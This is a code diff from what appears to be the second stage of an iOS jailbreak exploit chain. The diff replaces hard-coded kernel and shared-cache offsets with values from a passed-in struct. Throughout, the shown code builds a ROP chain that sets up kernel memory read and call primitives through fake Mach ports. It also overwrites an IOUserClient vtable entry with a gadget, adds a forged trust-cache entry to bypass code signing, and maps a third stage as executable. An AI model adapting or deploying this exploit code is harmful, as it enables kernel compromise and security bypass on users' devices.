@@ -11,9 +11,12 @@
 #include "stage1.h"
 #include "stage2.h"
 
-#include "../shared/offsets.h"
 #include "generated/stage2_hash3.h"
 #include "generated/stage2_hash4.h"
+
+#if !defined(MAP_ANONYMOUS) && defined(MAP_ANON)
+#define MAP_ANONYMOUS MAP_ANON
+#endif
 
 // TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
 // get an address of a specific rop variable (basically rop var name to address)
@@ -292,9 +295,12 @@ uint64_t get_addr_from_name(offset_struct_t* offsets, char* name)
         exit(1);
     }
     uint64_t cache_addr = 0;
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
     syscall(294, &cache_addr); // get the current slid cache address
+#pragma clang diagnostic pop
     // unslide the ptr returned by dlsym
-    sym += 0x180000000;
+    sym += offsets->old_cache_addr;
     sym -= cache_addr;
     return sym;
 }
@@ -345,7 +351,7 @@ void build_chain_DBG(offset_struct_t* offsets, rop_var_t* ropvars)
             buf = next->value;
             // we add and then we subtract otherwise it could underflow
             buf += offsets->new_cache_addr;
-            buf -= 0x180000000;
+            buf -= offsets->old_cache_addr;
             printf("0x%.8llx: ", current_addr);
             printf("0x%.8llx (code address org:%llx) ", buf, next->value);
             if (next->value == offsets->BEAST_GADGET) {
@@ -617,7 +623,7 @@ void build_databuffer(offset_struct_t* offsets, rop_var_t* ropvars)
     }
 }
 
-void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
+void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, offsets_t* lib_offsets, char* base_dir)
 {
     offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);
     memset(offsets->stage2_databuffer, 0, offsets->stage2_databuffer_len); // make sure everything is inited to 0
@@ -996,7 +1002,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     DEFINE_ROP_VAR("racer_kernel_thread", sizeof(thread_act_t), tmp);
     _STRUCT_ARM_THREAD_STATE64* new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
     memset(new_thread_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
-    new_thread_state->__pc = offsets->longjmp - 0x180000000 + offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
+    new_thread_state->__pc = offsets->longjmp - offsets->old_cache_addr + offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
     new_thread_state->__x[0] = offsets->stage2_base + offsets->stage2_max_size + offsets->stage2_barrier_buffer_size /*x0 should point to the longjmp buf*/; // this means we can easily just use a longjump buf at the front of the thread to control all regs
     DEFINE_ROP_VAR("thread_state", sizeof(_STRUCT_ARM_THREAD_STATE64), new_thread_state)
     ROP_VAR_ARG_HOW_MANY(3);
@@ -1116,13 +1122,13 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
 
     DEFINE_ROP_VAR("out_sz", 8, tmp);
     SET_ROP_VAR64("out_sz", 1);
-#define kr32(addr_var, valuename)                                          \
-    ROP_VAR_CPY_W_OFFSET("ip_requests_buf", OFF_IPR_SIZE, addr_var, 0, 8); \
-    ROP_VAR_ARG_HOW_MANY(4);                                               \
-    ROP_VAR_ARG64("self", 1);                                              \
-    ROP_VAR_ARG64("the_one", 2);                                           \
-    ROP_VAR_ARG(valuename, 4);                                             \
-    ROP_VAR_ARG("out_sz", 5);                                              \
+#define kr32(addr_var, valuename)                                                                  \
+    ROP_VAR_CPY_W_OFFSET("ip_requests_buf", lib_offsets->struct_offsets.ipr_size, addr_var, 0, 8); \
+    ROP_VAR_ARG_HOW_MANY(4);                                                                       \
+    ROP_VAR_ARG64("self", 1);                                                                      \
+    ROP_VAR_ARG64("the_one", 2);                                                                   \
+    ROP_VAR_ARG(valuename, 4);                                                                     \
+    ROP_VAR_ARG("out_sz", 5);                                                                      \
     CALL("mach_port_get_attributes", 0, 0, MACH_PORT_DNREQUESTS_SIZE, 0, 0, 0, 0, 0);
 
     // setup kr64
@@ -1146,7 +1152,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     // get the task pointer from our recv addr
     DEFINE_ROP_VAR("task_pointer", 8, tmp);
     DEFINE_ROP_VAR("heap_addr_task_ptr", 8, tmp);
-    SET_ROP_VAR64("heap_addr_task_ptr", OFF_IS_TASK);
+    SET_ROP_VAR64("heap_addr_task_ptr", lib_offsets->struct_offsets.is_task_offset);
     ROP_VAR_ADD("heap_addr_task_ptr", "heap_addr_task_ptr", "recv_heap_addr");
     kr64("heap_addr_task_ptr", "task_pointer");
 
@@ -1159,7 +1165,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     // get the address of the client port
     DEFINE_ROP_VAR("ip_kobject_client_port", 8, tmp);
     DEFINE_ROP_VAR("ip_kobject_ptr", 8, tmp);
-    SET_ROP_VAR64("ip_kobject_ptr", OFF_ITK_REGISTERED);
+    SET_ROP_VAR64("ip_kobject_ptr", lib_offsets->struct_offsets.itk_registered);
     ROP_VAR_ADD("ip_kobject_ptr", "ip_kobject_ptr", "task_pointer");
     kr64("ip_kobject_ptr", "ip_kobject_client_port");
 
@@ -1182,7 +1188,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     // fully setup trust chain entry now
     DEFINE_ROP_VAR("bss_trust_chain_head", 8, tmp);
     DEFINE_ROP_VAR("bss_trust_chain_head_ptr", 8, tmp);
-    SET_ROP_VAR64("bss_trust_chain_head_ptr", OFF_TRUST_CACHE);
+    SET_ROP_VAR64("bss_trust_chain_head_ptr", lib_offsets->data.trust_cache);
     ROP_VAR_ADD("bss_trust_chain_head_ptr", "bss_trust_chain_head_ptr", "kslide");
     kr64("bss_trust_chain_head_ptr", "bss_trust_chain_head");
     ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry", offsetof(struct trust_chain, next), "bss_trust_chain_head", 0, 8);
@@ -1262,7 +1268,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     // SET_ROP_VAR64_W_OFFSET("fakeport",0x4141414141414140,offsetof(kport_t,ip_kobject));
 
     // patch getExternalTrapForIndex
-    SET_ROP_VAR64("tmp_uint64", OFF_ADD_X0_X0_RET);
+    SET_ROP_VAR64("tmp_uint64", lib_offsets->gadgets.add_x0_x0_ret);
     ROP_VAR_ADD("tmp_uint64", "tmp_uint64", "kslide");
     ROP_VAR_CPY_W_OFFSET("UC_VTAB", (0xb7 * 8), "tmp_uint64", 0, 8);
 
@@ -1270,7 +1276,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
 
     // setup call primitive
     DEFINE_ROP_VAR("copyin_func_ptr", 8, tmp);
-    SET_ROP_VAR64("copyin_func_ptr", OFF_COPYIN);
+    SET_ROP_VAR64("copyin_func_ptr", lib_offsets->funcs.copyin);
     ROP_VAR_ADD("copyin_func_ptr", "copyin_func_ptr", "kslide");
     ROP_VAR_CPY_W_OFFSET("fake_client", 0x48, "copyin_func_ptr", 0, 8);
     // setup x0
@@ -1308,64 +1314,6 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, char* base_dir)
     ROP_VAR_ARG64("dylib_fd", 5);
     CALL("__mmap", offsets->stage3_loadaddr, offsets->stage3_size, PROT_EXEC | PROT_READ, MAP_FIXED | MAP_PRIVATE, 0, offsets->stage3_fileoffset, 0, 0);
 
-    // populate the struct we pass over to stage 3 with all the values it needs
-    offsets_t* lib_offsets = malloc(sizeof(offsets_t));
-    memset(lib_offsets, 0, sizeof(offsets_t));
-    lib_offsets->constant.kernel_image_base = OFF_KERNEL_IMAGE_BASE;
-    lib_offsets->funcs.copyin = OFF_COPYIN;
-    lib_offsets->funcs.copyout = OFF_COPYOUT;
-    lib_offsets->funcs.current_task = OFF_CURRENT_TASK;
-    lib_offsets->funcs.get_bsdtask_info = OFF_GET_BSDTASK_INFO;
-    lib_offsets->funcs.vm_map_wire_external = OFF_VM_MAP_WIRE_EXTERNAL;
-    lib_offsets->funcs.vfs_context_current = OFF_VFS_CONTEXT_CURRENT;
-    lib_offsets->funcs.vnode_lookup = OFF_VNODE_LOOKUP;
-    lib_offsets->funcs.osunserializexml = OFF_OSUNSERIALIZEXML;
-    lib_offsets->funcs.smalloc = OFF_SMALLOC; // isn't used anymore
-    lib_offsets->funcs.ipc_port_alloc_special = OFF_IPC_PORT_ALLOC_SPECIAL;
-    lib_offsets->funcs.ipc_kobject_set = OFF_IPC_KOBJECT_SET;
-    lib_offsets->funcs.ipc_port_make_send = OFF_IPC_PORT_MAKE_SEND;
-    lib_offsets->gadgets.add_x0_x0_ret = OFF_ADD_X0_X0_RET;
-    lib_offsets->data.realhost = OFF_REALHOST;
-    lib_offsets->data.zone_map = OFF_ZONE_MAP;
-    lib_offsets->data.kernel_task = OFF_KERNEL_TASK;
-    lib_offsets->data.kern_proc = OFF_KERN_PROC;
-    lib_offsets->data.rootvnode = OFF_ROOTVNODE;
-    lib_offsets->data.osboolean_true = OFF_OSBOOLEAN_TRUE; // isn't used anymore
-    lib_offsets->data.trust_cache = OFF_TRUST_CACHE; // isn't used by stage 3
-    // maybe wrong (we will not include them in the symbol finder for now, if that fails we still have the killswitch and could add version differences later)
-    lib_offsets->struct_offsets.is_task_offset = OFF_IS_TASK;
-    lib_offsets->struct_offsets.task_itk_self = OFF_TASK_ITK_SELF;
-    lib_offsets->struct_offsets.itk_registered = OFF_ITK_REGISTERED;
-    lib_offsets->struct_offsets.ipr_size = OFF_IPR_SIZE;
-    lib_offsets->struct_offsets.sizeof_task = OFF_SIZEOF_TASK;
-    lib_offsets->struct_offsets.task_all_image_info_addr = OFF_TASK_ALL_IMAGE_INFO_ADDR;
-    lib_offsets->struct_offsets.task_all_image_info_size = OFF_TASK_ALL_IMAGE_INFO_SIZE;
-// iosurface stuff isn't set and also isn't used
-#if (N66AP & IOS_11_3_1)
-    lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(OFF_IOCONNECTTRAP6);
-    lib_offsets->userland_funcs.mach_ports_lookup = (void*)(OFF_MACH_PORTS_LOOKUP);
-    lib_offsets->userland_funcs.mach_task_self = (void*)(OFF_MACH_TASK_SELF);
-    lib_offsets->userland_funcs.mach_vm_remap = (void*)(OFF_MACH_VM_REMAP);
-    lib_offsets->userland_funcs.mach_port_destroy = (void*)(OFF_MACH_PORT_DESTROY);
-    lib_offsets->userland_funcs.mach_port_deallocate = (void*)(OFF_MACH_PORT_DEALLOCATE);
-    lib_offsets->userland_funcs.mach_port_allocate = (void*)(OFF_MACH_PORT_ALLOCATE);
-    lib_offsets->userland_funcs.mach_port_insert_right = (void*)(OFF_MACH_PORT_INSERT_RIGHT);
-    lib_offsets->userland_funcs.mach_ports_register = (void*)(OFF_MACH_PORTS_REGISTER);
-    lib_offsets->userland_funcs.mach_msg = (void*)(OFF_MACH_MSG);
-    lib_offsets->userland_funcs.posix_spawn = (void*)(OFF_POSIX_SPAWN);
-#else
-    lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets, "IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets, "mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(offsets, "mach_task_self") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_vm_remap = (void*)(offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_port_destroy = (void*)(get_addr_from_name(offsets, "mach_port_destroy") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_port_deallocate = (void*)(get_addr_from_name(offsets, "mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_port_allocate = (void*)(get_addr_from_name(offsets, "mach_port_allocate") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_port_insert_right = (void*)(get_addr_from_name(offsets, "mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(offsets, "mach_ports_register") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(offsets, "mach_msg") - 0x180000000 + offsets->new_cache_addr);
-    lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(offsets, "posix_spawn") - 0x180000000 + offsets->new_cache_addr);
-#endif
     DEFINE_ROP_VAR("lib_offsets", sizeof(offsets_t), lib_offsets);
     // jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
     ROP_VAR_ARG_HOW_MANY(7);
